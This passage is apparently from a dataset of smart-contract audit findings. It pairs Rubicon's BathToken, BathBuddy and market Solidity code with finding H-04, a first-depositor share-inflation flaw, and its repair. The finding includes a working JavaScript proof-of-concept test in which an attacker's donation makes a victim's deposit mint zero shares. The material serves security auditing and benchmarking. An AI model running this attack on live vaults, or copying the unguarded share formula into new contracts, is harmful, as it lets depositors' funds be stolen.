bathHouse = msg.sender; //NOTE: assumed admin is creator on BathHouse\n\n        uint256 chainId;\n        assembly {\n            chainId := chainid()\n        }\n        DOMAIN_SEPARATOR = keccak256(\n            abi.encode(\n                keccak256(\n                    \"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"\n                ),\n                keccak256(bytes(name)),\n                keccak256(bytes(\"1\")),\n                chainId,\n                address(this)\n            )\n        );\n        name = string(abi.encodePacked(_symbol, (\" v1\")));\n        decimals = token.decimals(); // v1 Change - 4626 Adherence\n\n        // Add infinite approval of Rubicon Market for this asset\n        IERC20(address(token)).approve(RubiconMarketAddress, 2**256 - 1);\n        emit LogInit(block.timestamp);\n\n        feeTo = address(this); //This contract is the fee recipient, rewarding HODLers\n        feeBPS = 3; //Fee set to 3 BPS initially\n\n        // Complete constract instantiation\n        initialized = true;\n    }\n\n    /// *** Modifiers ***\n\n    modifier onlyPair() {\n        require(\n            IBathHouse(bathHouse).isApprovedPair(msg.sender) == true,\n            \"not an approved pair - bathToken\"\n        );\n        _;\n    }\n\n    modifier onlyBathHouse() {\n        require(\n            msg.sender == bathHouse,\n            \"caller is not bathHouse - BathToken.sol\"\n        );\n        _;\n    }\n\n    /// *** External Functions - Only Bath House / Admin ***\n\n    /// @notice Admin-only function to set a Bath Token's market address\n    function setMarket(address newRubiconMarket) external onlyBathHouse {\n        RubiconMarketAddress = newRubiconMarket;\n    }\n\n    /// @notice Admin-only function to set a Bath Token's Bath House admin\n    function setBathHouse(address newBathHouse) external onlyBathHouse {\n        bathHouse = newBathHouse;\n    }\n\n    /// @notice Admin-only function to approve Bath Token's RubiconMarketAddress with the maximum integer value (infinite approval)\n    function approveMarket() external onlyBathHouse {\n        underlyingToken.approve(RubiconMarketAddress, 2**256 - 1);\n    }\n\n    /// @notice Admin-only function to set a Bath Token's feeBPS\n    function setFeeBPS(uint256 _feeBPS) external onlyBathHouse {\n        feeBPS = _feeBPS;\n    }\n\n    /// @notice Admin-only function to set a Bath Token's fee recipient, typically the pool itself\n    function setFeeTo(address _feeTo) external onlyBathHouse {\n        feeTo = _feeTo;\n    }\n\n    /// @notice Admin-only function to add a bonus token to bonusTokens for pool incentives\n    function setBonusToken(address newBonusERC20) external onlyBathHouse {\n        bonusTokens.push(newBonusERC20);\n    }\n\n    /// *** External Functions - Only Approved Bath Pair / Strategist Contract ***\n\n    /// ** Rubicon Market Functions **\n\n    /// @notice The function for a strategist to cancel an outstanding Market Offer\n    function cancel(uint256 id, uint256 amt) external onlyPair {\n        outstandingAmount = outstandingAmount.sub(amt);\n        IRubiconMarket(RubiconMarketAddress).cancel(id);\n\n        emit LogPoolCancel(\n            id,\n            IERC20(underlyingToken),\n            amt,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n    }\n\n    /// @notice A function called by BathPair to maintain proper accounting of outstandingAmount\n    function removeFilledTradeAmount(uint256 amt) external onlyPair {\n        outstandingAmount = outstandingAmount.sub(amt);\n        emit LogRemoveFilledTradeAmount(\n            IERC20(underlyingToken),\n            amt,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n    }\n\n    /// @notice The function that places a bid and/or ask in the orderbook for a given pair from this pool\n    function placeOffer(\n        uint256 pay_amt,\n        ERC20 pay_gem,\n        uint256 buy_amt,\n        ERC20 buy_gem\n    ) external onlyPair returns (uint256) {\n        // Place an offer in RubiconMarket\n        // If incomplete offer return 0\n        if (\n            pay_amt == 0 ||\n            pay_gem == ERC20(0) ||\n            buy_amt == 0 ||\n            buy_gem == ERC20(0)\n        ) {\n            return 0;\n        }\n\n        uint256 id = IRubiconMarket(RubiconMarketAddress).offer(\n            pay_amt,\n            pay_gem,\n            buy_amt,\n            buy_gem,\n            0,\n            false\n        );\n        outstandingAmount = outstandingAmount.add(pay_amt);\n\n        emit LogPoolOffer(\n            id,\n            IERC20(underlyingToken),\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n        return (id);\n    }\n\n    /// @notice This function returns filled orders to the correct liquidity pool and sends strategist rewards to the Bath Pair\n    /// @dev Sends non-underlyingToken fill elsewhere in the Pools system, typically it's sister asset within a trading pair (e.g. ETH-USDC)\n    /// @dev Strategists presently accrue rewards in the filled asset not underlyingToken\n    function rebalance(\n        address destination,\n        address filledAssetToRebalance, /* sister or fill asset */\n        uint256 stratProportion,\n        uint256 rebalAmt\n    ) external onlyPair {\n        uint256 stratReward = (stratProportion.mul(rebalAmt)).div(10000);\n        IERC20(filledAssetToRebalance).transfer(\n            destination,\n            rebalAmt.sub(stratReward)\n        );\n        IERC20(filledAssetToRebalance).transfer(msg.sender, stratReward);\n\n        emit LogRebalance(\n            IERC20(underlyingToken),\n            destination,\n            IERC20(filledAssetToRebalance),\n            rebalAmt,\n            stratReward,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n    }\n\n    /// *** EIP 4626 Implementation ***\n    // https://eips.ethereum.org/EIPS/eip-4626#specification\n\n    /// @notice Withdraw your bathTokens for the underlyingToken\n    function withdraw(uint256 _shares)\n        external\n        returns (uint256 amountWithdrawn)\n    {\n        return _withdraw(_shares, msg.sender);\n    }\n\n    /// @notice * EIP 4626 *\n    function asset() public view returns (address assetTokenAddress) {\n        assetTokenAddress = address(underlyingToken);\n    }\n\n    /// @notice * EIP 4626 *\n    function totalAssets() public view returns (uint256 totalManagedAssets) {\n        return underlyingBalance();\n    }\n\n    /// @notice * EIP 4626 *\n    function convertToShares(uint256 assets)\n        public\n        view\n        returns (uint256 shares)\n    {\n        // Note: Inflationary tokens may affect this logic\n        (totalSupply == 0) ? shares = assets : shares = (\n            assets.mul(totalSupply)\n        ).div(totalAssets());\n    }\n\n    // Note: MUST NOT be inclusive of any fees that are charged against assets in the Vault.\n    /// @notice * EIP 4626 *\n    function convertToAssets(uint256 shares)\n        public\n        view\n        returns (uint256 assets)\n    {\n        assets = (totalAssets().mul(shares)).div(totalSupply);\n    }\n\n    // Note: Unused function param to adhere to standard\n    /// @notice * EIP 4626 *\n    function maxDeposit(address receiver)\n        public\n        pure\n        returns (uint256 maxAssets)\n    {\n        maxAssets = 2**256 - 1; // No limit on deposits in current implementation  = Max UINT\n    }\n\n    /// @notice * EIP 4626 *\n    function previewDeposit(uint256 assets)\n        public\n        view\n        returns (uint256 shares)\n    {\n        // The exact same logic is used, no deposit fee - only difference is deflationary token check (rare condition and probably redundant)\n        shares = convertToShares(assets);\n    }\n\n    // Single asset override to reflect old functionality\n    function deposit(uint256 assets) public returns (uint256 shares) {\n        // Note: msg.sender is the same throughout the same contract context\n        return _deposit(assets, msg.sender);\n    }\n\n    /// @notice * EIP 4626 *\n    function deposit(uint256 assets, address receiver)\n        public\n        returns (uint256 shares)\n    {\n        return _deposit(assets, receiver);\n    }\n\n    // Note: Unused function param to adhere to standard\n    /// @notice * EIP 4626 *\n    function maxMint(address receiver) public pure returns (uint256 maxShares) {\n        maxShares = 2**256 - 1; // No limit on shares that could be created via deposit in current implementation - Max UINT\n    }\n\n    // Given I want these shares, how much do I have to deposit\n    /// @notice * EIP 4626 *\n    function previewMint(uint256 shares) public view returns (uint256 assets) {\n        (totalSupply == 0) ? assets = shares : assets = (\n            shares.mul(totalAssets())\n        ).div(totalSupply);\n    }\n\n    // Mints exactly shares Vault shares to receiver by depositing amount of underlying tokens.\n    /// @notice * EIP 4626 *\n    function mint(uint256 shares, address receiver)\n        public\n        returns (uint256 assets)\n    {\n        assets = previewMint(shares);\n        uint256 _shares = _deposit(assets, receiver);\n        require(_shares == shares, \"did not mint expected share count\");\n    }\n\n    // A user can withdraw whatever they hold\n    /// @notice * EIP 4626 *\n    function maxWithdraw(address owner)\n        public\n        view\n        returns (uint256 maxAssets)\n    {\n        if (totalSupply == 0) {\n            maxAssets = 0;\n        } else {\n            uint256 ownerShares = balanceOf[owner];\n            maxAssets = convertToAssets(ownerShares);\n        }\n    }\n\n    /// @notice * EIP 4626 *\n    function previewWithdraw(uint256 assets)\n        public\n        view\n        returns (uint256 shares)\n    {\n        if (totalSupply == 0) {\n            shares = 0;\n        } else {\n            uint256 amountWithdrawn;\n            uint256 _fee = assets.mul(feeBPS).div(10000);\n            amountWithdrawn = assets.sub(_fee);\n            shares = convertToShares(amountWithdrawn);\n        }\n    }\n\n    /// @notice * EIP 4626 *\n    function withdraw(\n        uint256 assets,\n        address receiver,\n        address owner\n    ) public returns (uint256 shares) {\n        require(\n            owner == msg.sender,\n            \"This implementation does not support non-sender owners from withdrawing user shares\"\n        );\n        uint256 expectedShares = previewWithdraw(assets);\n        uint256 assetsReceived = _withdraw(expectedShares, receiver);\n        require(\n            assetsReceived >= assets,\n            \"You cannot withdraw the amount of assets you expected\"\n        );\n        shares = expectedShares;\n    }\n\n    // Constraint: msg.sender is owner of shares when withdrawing\n    /// @notice * EIP 4626 *\n    function maxRedeem(address owner) public view returns (uint256 maxShares) {\n        return balanceOf[owner];\n    }\n\n    // Constraint: msg.sender is owner of shares when withdrawing\n    /// @notice * EIP 4626 *\n    function previewRedeem(uint256 shares)\n        public\n        view\n        returns (uint256 assets)\n    {\n        uint256 r = (underlyingBalance().mul(shares)).div(totalSupply);\n        uint256 _fee = r.mul(feeBPS).div(10000);\n        assets = r.sub(_fee);\n    }\n\n    /// @notice * EIP 4626 *\n    function redeem(\n        uint256 shares,\n        address receiver,\n        address owner\n    ) public returns (uint256 assets) {\n        require(\n            owner == msg.sender,\n            \"This implementation does not support non-sender owners from withdrawing user shares\"\n        );\n        assets = _withdraw(shares, receiver);\n    }\n\n    /// *** Internal Functions ***\n\n    /// @notice Deposit assets for the user and mint Bath Token shares to receiver\n    function _deposit(uint256 assets, address receiver)\n        internal\n        returns (uint256 shares)\n    {\n        uint256 _pool = underlyingBalance();\n        uint256 _before = underlyingToken.balanceOf(address(this));\n\n        // **Assume caller is depositor**\n        underlyingToken.transferFrom(msg.sender, address(this), assets);\n        uint256 _after = underlyingToken.balanceOf(address(this));\n        assets = _after.sub(_before); // Additional check for deflationary tokens\n\n        (totalSupply == 0) ? shares = assets : shares = (\n            assets.mul(totalSupply)\n        ).div(_pool);\n\n        // Send shares to designated target\n        _mint(receiver, shares);\n        emit LogDeposit(\n            assets,\n            underlyingToken,\n            shares,\n            msg.sender,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n        emit Deposit(msg.sender, msg.sender, assets, shares);\n    }\n\n    /// @notice Withdraw share for the user and send underlyingToken to receiver with any accrued yield and incentive tokens\n    function _withdraw(uint256 _shares, address receiver)\n        internal\n        returns (uint256 amountWithdrawn)\n    {\n        uint256 _initialTotalSupply = totalSupply;\n\n        // Distribute network rewards first in order to handle bonus token == underlying token case; it only releases vested tokens in this call\n        distributeBonusTokenRewards(receiver, _shares, _initialTotalSupply);\n\n        uint256 r = (underlyingBalance().mul(_shares)).div(_initialTotalSupply);\n        _burn(msg.sender, _shares);\n        uint256 _fee = r.mul(feeBPS).div(10000);\n        // If FeeTo == address(0) then the fee is effectively accrued by the pool\n        if (feeTo != address(0)) {\n            underlyingToken.transfer(feeTo, _fee);\n        }\n        amountWithdrawn = r.sub(_fee);\n        underlyingToken.transfer(receiver, amountWithdrawn);\n\n        emit LogWithdraw(\n            amountWithdrawn,\n            underlyingToken,\n            _shares,\n            msg.sender,\n            _fee,\n            feeTo,\n            underlyingBalance(),\n            outstandingAmount,\n            totalSupply\n        );\n        emit Withdraw(\n            msg.sender,\n            receiver,\n            msg.sender,\n            amountWithdrawn,\n            _shares\n        );\n    }\n\n    /// @notice Function to distibute non-underlyingToken Bath Token incentives to pool withdrawers\n    /// @dev Note that bonusTokens adhere to the same feeTo and feeBPS pattern. Fees sit on BathBuddy to act as effectively accrued to the pool.\n    function distributeBonusTokenRewards(\n        address receiver,\n        uint256 sharesWithdrawn,\n        uint256 initialTotalSupply\n    ) internal {\n        if (bonusTokens.length > 0) {\n            for (uint256 index = 0; index < bonusTokens.length; index++) {\n                IERC20 token = IERC20(bonusTokens[index]);\n                // Note: Shares already burned in Bath Token _withdraw\n\n                // Pair each bonus token with a lightly adapted OZ Vesting wallet. Each time a user withdraws, they\n                //  are released their relative share of this pool, of vested BathBuddy rewards\n                // The BathBuddy pool should accrue ERC-20 rewards just like OZ VestingWallet and simply just release the withdrawer's relative share of releaseable() tokens\n                if (rewardsVestingWallet != IBathBuddy(0)) {\n                    rewardsVestingWallet.release(\n                        (token),\n                        receiver,\n                        sharesWithdrawn,\n                        initialTotalSupply,\n                        feeBPS\n                    );\n                }\n            }\n        }\n    }\n\n    /// *** ERC - 20 Standard ***\n\n    function _mint(address to, uint256 value) internal {\n        totalSupply = totalSupply.add(value);\n        balanceOf[to] = balanceOf[to].add(value);\n        emit Transfer(address(0), to, value);\n    }\n\n    function _burn(address from, uint256 value) internal {\n        balanceOf[from] = balanceOf[from].sub(value);\n        totalSupply = totalSupply.sub(value);\n        emit Transfer(from, address(0), value);\n    }\n\n    function _approve(\n        address owner,\n        address spender,\n        uint256 value\n    ) private {\n        allowance[owner][spender] = value;\n        emit Approval(owner, spender, value);\n    }\n\n    function _transfer(\n        address from,\n        address to,\n        uint256 value\n    ) private {\n        balanceOf[from] = balanceOf[from].sub(value);\n        balanceOf[to] = balanceOf[to].add(value);\n        emit Transfer(from, to, value);\n    }\n\n    function approve(address spender, uint256 value) external returns (bool) {\n        _approve(msg.sender, spender, value);\n        return true;\n    }\n\n    function transfer(address to, uint256 value) external returns (bool) {\n        _transfer(msg.sender, to, value);\n        return true;\n    }\n\n    function transferFrom(\n        address from,\n        address to,\n        uint256 value\n    ) external returns (bool) {\n        if (allowance[from][msg.sender] != uint256(-1)) {\n            allowance[from][msg.sender] = allowance[from][msg.sender].sub(\n                value\n            );\n        }\n        _transfer(from, to, value);\n        return true;\n    }\n\n    /// @notice EIP 2612\n    function permit(\n        address owner,\n        address spender,\n        uint256 value,\n        uint256 deadline,\n        uint8 v,\n        bytes32 r,\n        bytes32 s\n    ) external {\n        require(deadline >= block.timestamp, \"bathToken: EXPIRED\");\n        bytes32 digest = keccak256(\n            abi.encodePacked(\n                \"\\x19\\x01\",\n                DOMAIN_SEPARATOR,\n                keccak256(\n                    abi.encode(\n                        PERMIT_TYPEHASH,\n                        owner,\n                        spender,\n                        value,\n                        nonces[owner]++,\n                        deadline\n                    )\n                )\n            )\n        );\n        address recoveredAddress = ecrecover(digest, v, r, s);\n        require(\n            recoveredAddress != address(0) && recoveredAddress == owner,\n            \"bathToken: INVALID_SIGNATURE\"\n        );\n        _approve(owner, spender, value);\n    }\n\n    /// *** View Functions ***\n\n    /// @notice The underlying ERC-20 that this bathToken handles\n    function underlyingERC20() external view returns (address) {\n        return address(underlyingToken);\n    }\n\n    /// @notice The best-guess total claim on assets the Bath Token has\n    /// @dev returns the amount of underlying ERC20 tokens in this pool in addition to any tokens that are outstanding in the Rubicon order book seeking market-making yield (outstandingAmount)\n    function underlyingBalance() public view returns (uint256) {\n        uint256 _pool = IERC20(underlyingToken).balanceOf(address(this));\n        return _pool.add(outstandingAmount);\n    }\n}\n\n\n",
        "CodeNames": [
            "BathHouse.sol",
            "RubiconMarket.sol",
            "BathToken.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-04",
                "Location": [
                    "js\n(totalSupply == 0) ? shares = assets : shares = (\n    assets.mul(totalSupply)\n).div(_pool);\n",
                    "js\nit(\"Victim receives 0 shares\", async () = {\n    // 1. Attacker deposits 1 testCoin first when creating the liquidity pool\n    const initialLiquidityNew = 1;\n    const initialLiquidityExistingBathToken = ethers.utils.parseUnits(\"100\", decimals);\n    \n    // Approve DAI and testCoin for bathHouseInstance\n    await testCoin.approve(bathHouseInstance.address, initialLiquidityNew, {\n        from: attacker,\n    });\n    await DAIInstance.approve(\n        bathHouseInstance.address,\n        initialLiquidityExistingBathToken,\n        { from: attacker }\n    );\n\n    // Call open creation function, attacker deposits only 1 testCoin\n    const desiredPairedAsset = await DAIInstance.address;\n    await bathHouseInstance.openBathTokenSpawnAndSignal(\n        await testCoin.address,\n        initialLiquidityNew,\n        desiredPairedAsset,\n        initialLiquidityExistingBathToken,\n        { from: attacker }\n    );\n    \n    // Retrieve resulting bathToken address\n    const newbathTokenAddress = await bathHouseInstance.getBathTokenfromAsset(testCoin.address);\n    const _newBathToken = await BathToken.at(newbathTokenAddress);\n\n    // 2. Attacker deposits large amount of testCoin into liquidity pool\n    let attackerAmt = ethers.utils.parseUnits(\"1000000\", decimals);\n    await testCoin.approve(newbathTokenAddress, attackerAmt, {from: attacker});\n    await testCoin.transfer(newbathTokenAddress, attackerAmt, {from: attacker});\n\n    // 3. Victim deposits a smaller amount of testCoin, receives 0 shares\n    // In this case, we use (1 million 1) testCoin\n    let victimAmt = ethers.utils.parseUnits(\"999999\", decimals);\n    await testCoin.approve(newbathTokenAddress, victimAmt, {from: victim});\n    await _newBathToken.deposit(victimAmt, victim, {from: victim});\n    \n    assert.equal(await _newBathToken.balanceOf(victim), 0);\n});\n"
                ],
                "Type": " First depositor can break minting of shares",
                "Description": "\nThe attack vector and impact is the same as TOB-YEARN-003(https://github.com/yearn/yearn-security/blob/master/audits/20210719_ToB_yearn_vaultsv2/ToB_-_Yearn_Vault_v_2_Smart_Contracts_Audit_Report.pdf), where users may not receive shares in exchange for their deposits if the total asset amount has been manipulated through a large \u201cdonation\u201d.\n\n\nIn BathToken.sol:569-571, the allocation of shares is calculated as follows:\n\njs\n(totalSupply == 0) ? shares = assets : shares = (\n    assets.mul(totalSupply)\n).div(_pool);\n\n\nAn early attacker can exploit this by:\n\n*   Attacker calls openBathTokenSpawnAndSignal() with initialLiquidityNew = 1, creating a new bath token with totalSupply = 1\n*   Attacker transfers a large amount of underlying tokens to the bath token contract, such as 1000000\n*   Using deposit(), a victim deposits an amount less than 1000000, such as 1000:\n    *   assets = 1000\n    *   (assets * totalSupply) / _pool = (1000 * 1) / 1000000 = 0.001, which would round down to 0\n    *   Thus, the victim receives no shares in return for his deposit\n\nTo avoid minting 0 shares, subsequent depositors have to deposit equal to or more than the amount transferred by the attacker. Otherwise, their deposits accrue to the attacker who holds the only share.\n\njs\nit(\"Victim receives 0 shares\", async () = {\n    // 1. Attacker deposits 1 testCoin first when creating the liquidity pool\n    const initialLiquidityNew = 1;\n    const initialLiquidityExistingBathToken = ethers.utils.parseUnits(\"100\", decimals);\n    \n    // Approve DAI and testCoin for bathHouseInstance\n    await testCoin.approve(bathHouseInstance.address, initialLiquidityNew, {\n        from: attacker,\n    });\n    await DAIInstance.approve(\n        bathHouseInstance.address,\n        initialLiquidityExistingBathToken,\n        { from: attacker }\n    );\n\n    // Call open creation function, attacker deposits only 1 testCoin\n    const desiredPairedAsset = await DAIInstance.address;\n    await bathHouseInstance.openBathTokenSpawnAndSignal(\n        await testCoin.address,\n        initialLiquidityNew,\n        desiredPairedAsset,\n        initialLiquidityExistingBathToken,\n        { from: attacker }\n    );\n    \n    // Retrieve resulting bathToken address\n    const newbathTokenAddress = await bathHouseInstance.getBathTokenfromAsset(testCoin.address);\n    const _newBathToken = await BathToken.at(newbathTokenAddress);\n\n    // 2. Attacker deposits large amount of testCoin into liquidity pool\n    let attackerAmt = ethers.utils.parseUnits(\"1000000\", decimals);\n    await testCoin.approve(newbathTokenAddress, attackerAmt, {from: attacker});\n    await testCoin.transfer(newbathTokenAddress, attackerAmt, {from: attacker});\n\n    // 3. Victim deposits a smaller amount of testCoin, receives 0 shares\n    // In this case, we use (1 million 1) testCoin\n    let victimAmt = ethers.utils.parseUnits(\"999999\", decimals);\n    await testCoin.approve(newbathTokenAddress, victimAmt, {from: victim});\n    await _newBathToken.deposit(victimAmt, victim, {from: victim});\n    \n    assert.equal(await _newBathToken.balanceOf(victim), 0);\n});\n\n\n",
                "Repair": "\n*   Uniswap V2 solved this problem by sending the first 1000 LP tokens to the zero address(https://github.com/Uniswap/v2-core/blob/master/contracts/UniswapV2Pair.sol#L119-L124). The same can be done in this case i.e. when totalSupply() == 0, send the first min liquidity LP tokens to the zero address to enable share dilution.\n*   In _deposit(), ensure the number of shares to be minted is non-zero:\n\nrequire(shares != 0, \"No shares minted\");\n\nbghughes (Rubicon) confirmed and commented(https://github.com/code-423n4/2022-05-rubicon-findings/issues/397#issuecomment-1171626800):\n  Great issue, what do y'all think of this code snippet as a solution:\n \n \n  /// @notice Deposit assets for the user and mint Bath Token shares to receiver\n     function _deposit(uint256 assets, address receiver)\n         internal\n         returns (uint256 shares)\n     {\n         uint256 _pool = underlyingBalance();\n         uint256 _before = underlyingToken.balanceOf(address(this));\n \n         // Assume caller is depositor\n         underlyingToken.safeTransferFrom(msg.sender, address(this), assets);\n         uint256 _after = underlyingToken.balanceOf(address(this));\n         assets = _after.sub(_before); // Additional check for deflationary tokens\n \n         if (totalSupply == 0) {\n             uint minLiquidityShare = 103;\n             shares = assets.sub(minLiquidityShare);\n             // Handle protecting from an initial supply spoof attack\n             _mint(address(0), (minLiquidityShare));\n         } else {\n             shares = (assets.mul(totalSupply)).div(_pool);\n         }\n \n         // Send shares to designated target\n         _mint(receiver, shares);\n \n         require(shares != 0, \"No shares minted\");\n         emit LogDeposit(\n             assets,\n             underlyingToken,\n             shares,\n             msg.sender,\n             underlyingBalance(),\n             outstandingAmount,\n             totalSupply\n         );\n         emit Deposit(msg.sender, msg.sender, assets, shares);\n     }\n \n\nHickupHH3 (judge) commented(https://github.com/code-423n4/2022-05-rubicon-findings/issues/397#issuecomment-1171813747):\n  LGTM :P\n\n\n\n*\n\n\n"
            }
        ]
    },
    {
        "Code": "// SPDX-License-Identifier: MIT\npragma solidity >=0.6.0 <0.8.0;\n\nimport \"./VestingWallet.sol\";\nimport \"../interfaces/IBathBuddy.sol\";\nimport \"@openzeppelin/contracts/token/ERC20/IERC20.sol\";\n\n/**\n * @title BathBuddy\n * @dev *** This contract is a lightly modified version of Vesting Wallet by OpenZeppelin\n * @dev PLEASE FIND OZ DOCUMENTATION FOR THIS CONTRACT HERE: https://docs.openzeppelin.com/contracts/4.x/api/finance#VestingWallet\n *\n * @dev The only entrypoint used in the system is the release function called by the Bath Token. Extra care should be taken to make sure only the beneficiary can ever access the funds and send them to the withdrawer (and fee to self)\n *\n * @dev This contract handles the vesting ERC20 tokens for a given beneficiary. Custody of multiple tokens\n * can be given to this contract, which will release the token to the beneficiary following a given vesting schedule.\n * The vesting schedule is customizable through the {vestedAmount} function.\n *\n * Any token transferred to this contract will follow the vesting schedule as if they were locked from the beginning.\n * Consequently, if the vesting has already started, any amount of tokens sent to this contract will (at least partly)\n * be immediately releasable.\n */\ncontract BathBuddy is IBathBuddy {\n    using SafeMath for uint256;\n\n    // Public versions of the base VestingWallet storage\n    uint256 private _released;\n    mapping(address => uint256) private _erc20Released;\n\n    // Beneficiary must be the Bath Token vault recipient that will call release() for its withdrawer\n    address public beneficiary;\n    uint64 public start;\n    uint64 public duration;\n\n    /**\n     * @dev Set the beneficiary, start timestamp and vesting duration of the vesting wallet.\n     */\n    constructor(\n        address beneficiaryAddress,\n        uint64 startTimestamp,\n        uint64 durationSeconds\n    ) {\n        require(\n            beneficiaryAddress != address(0),\n            \"VestingWallet: beneficiary is zero address\"\n        );\n        beneficiary = beneficiaryAddress;\n        start = startTimestamp;\n        duration = durationSeconds;\n    }\n\n    // OZ\n    event EtherReleased(uint256 amount);\n    event ERC20Released(address indexed token, uint256 amount);\n\n    /// @notice Log bonus token reward event\n    event LogClaimBonusToken(\n        address indexed receiver,\n        address indexed callingPool,\n        uint256 amountReceived,\n        uint256 shares,\n        IERC20 bonusToken,\n        uint256 releasableAmountToWholePool\n    );\n\n    /**\n     * @dev The contract should be able to receive Eth.\n     */\n    receive() external payable {}\n\n    /**\n     * @dev Amount of eth already released\n     */\n    function released() public view returns (uint256) {\n        return _released;\n    }\n\n    /**\n     * @dev Amount of token already released\n     */\n    function released(address token) public view returns (uint256) {\n        return _erc20Released[token];\n    }\n\n    /// @inheritdoc IBathBuddy\n    /// @dev Added and modified release function. Should be the only callable release function\n    function release(\n        IERC20 token,\n        address recipient,\n        uint256 sharesWithdrawn,\n        uint256 initialTotalSupply,\n        uint256 poolFee\n    ) external override {\n        require(\n            msg.sender == beneficiary,\n            \"Caller is not the Bath Token beneficiary of these rewards\"\n        );\n        uint256 releasable = vestedAmount(\n            address(token),\n            uint64(block.timestamp)\n        ) - released(address(token));\n        if (releasable > 0) {\n            uint256 amount = releasable.mul(sharesWithdrawn).div(\n                initialTotalSupply\n            );\n            uint256 _fee = amount.mul(poolFee).div(10000);\n\n            // If FeeTo == address(this) then the fee is effectively accrued by the pool\n            // Assume the caller is the liquidity pool and they receive the fee\n            // Keep tokens here by not transfering the _fee anywhere, it is accrued to the Bath Token's Bath Buddy\n            // token.transfer(address(this), _fee);\n\n            uint256 amountWithdrawn = amount.sub(_fee);\n            token.transfer(recipient, amountWithdrawn);\n\n            _erc20Released[address(token)] += amount;\n            emit ERC20Released(address(token), amount);\n\n            emit LogClaimBonusToken(\n                recipient,\n                msg.sender,\n                amountWithdrawn,\n                sharesWithdrawn,\n                token,\n                releasable\n            );\n        }\n    }\n\n    /**\n     * @dev Calculates the amount of tokens that has already vested. Default implementation is a linear vesting curve.\n     */\n    function vestedAmount(address token, uint64 timestamp)\n        public\n        view\n        returns (uint256)\n    {\n        return\n            _vestingSchedule(\n                IERC20(token).balanceOf(address(this)) + released(token),\n                timestamp\n            );\n    }\n\n    /**\n     * @dev Virtual implementation of the vesting formula. This returns the amount vested, as a function of time, for\n     * an asset given its total historical allocation.\n     */\n    function _vestingSchedule(uint256 totalAllocation, uint64 timestamp)\n        internal\n        view\n        returns (uint256)\n    {\n        if (timestamp < start) {\n            return 0;\n        } else if (timestamp > start + duration) {\n            return totalAllocation;\n        } else {\n            return (totalAllocation * (timestamp - start)) / duration;\n        }\n    }\n}\n\n\n/// SPDX-License-Identifier: Apache-2.0\n/// This contract is a derivative work of the open-source work of Oasis DEX: https://github.com/OasisDEX/oasis\n\n/// @title RubiconMarket.sol\n/// @notice Please see the repository for this code at https://github.com/RubiconDeFi/rubicon-protocol-v1;\n\npragma solidity =0.7.6;\n\nimport \"@openzeppelin/contracts/token/ERC20/ERC20.sol\";\n\n/// @notice DSAuth events for authentication schema\ncontract DSAuthEvents {\n    event LogSetAuthority(address indexed authority);\n    event LogSetOwner(address indexed owner);\n}\n\n/// @notice DSAuth library for setting owner of the contract\n/// @dev Provides the auth modifier for authenticated function calls\ncontract DSAuth is DSAuthEvents {\n    address public owner;\n\n    function setOwner(address owner_) external auth {\n        owner = owner_;\n        emit LogSetOwner(owner);\n    }\n\n    modifier auth() {\n        require(isAuthorized(msg.sender), \"ds-auth-unauthorized\");\n        _;\n    }\n\n    function isAuthorized(address src) internal view returns (bool) {\n        if (src == address(this)) {\n            return true;\n        } else if (src == owner) {\n            return true;\n        } else {\n            return false;\n        }\n    }\n}\n\n/// @notice DSMath library for safe math without integer overflow/underflow\ncontract DSMath {\n    function add(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require((z = x + y) >= x, \"ds-math-add-overflow\");\n    }\n\n    function sub(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require((z = x - y) <= x, \"ds-math-sub-underflow\");\n    }\n\n    function mul(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        require(y == 0 || (z = x * y) / y == x, \"ds-math-mul-overflow\");\n    }\n\n    function min(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        return x <= y ? x : y;\n    }\n\n    function max(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        return x >= y ? x : y;\n    }\n\n    function imin(int256 x, int256 y) internal pure returns (int256 z) {\n        return x <= y ? x : y;\n    }\n\n    function imax(int256 x, int256 y) internal pure returns (int256 z) {\n        return x >= y ? x : y;\n    }\n\n    uint256 constant WAD = 10**18;\n    uint256 constant RAY = 10**27;\n\n    function wmul(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        z = add(mul(x, y), WAD / 2) / WAD;\n    }\n\n    function rmul(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        z = add(mul(x, y), RAY / 2) / RAY;\n    }\n\n    function wdiv(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        z = add(mul(x, WAD), y / 2) / y;\n    }\n\n    function rdiv(uint256 x, uint256 y) internal pure returns (uint256 z) {\n        z = add(mul(x, RAY), y / 2) / y;\n    }\n}\n\n// /// @notice ERC-20 interface as derived from EIP-20\n// contract ERC20 {\n//     function totalSupply() public view returns (uint256);\n\n//     function balanceOf(address guy) public view returns (uint256);\n\n//     function allowance(address src, address guy) public view returns (uint256);\n\n//     function approve(address guy, uint256 wad) public returns (bool);\n\n//     function transfer(address dst, uint256 wad) public returns (bool);\n\n//     function transferFrom(\n//         address src,\n//         address dst,\n//         uint256 wad\n//     ) public returns (bool);\n// }\n\n/// @notice Events contract for logging trade activity on Rubicon Market\n/// @dev Provides the key event logs that are used in all core functionality of exchanging on the Rubicon Market\ncontract EventfulMarket {\n    event LogItemUpdate(uint256 id);\n    event LogTrade(\n        uint256 pay_amt,\n        address indexed pay_gem,\n        uint256 buy_amt,\n        address indexed buy_gem\n    );\n\n    event LogMake(\n        bytes32 indexed id,\n        bytes32 indexed pair,\n        address indexed maker,\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint128 pay_amt,\n        uint128 buy_amt,\n        uint64 timestamp\n    );\n\n    event LogBump(\n        bytes32 indexed id,\n        bytes32 indexed pair,\n        address indexed maker,\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        uint128 pay_amt,\n        uint128 buy_amt,\n        uint64 timestamp\n    );\n\n    event LogTake(\n        bytes32 id,\n        bytes32 indexed pair,\n        address indexed maker,\n        ERC20 pay_gem,\n        ERC20 buy_gem,\n        address 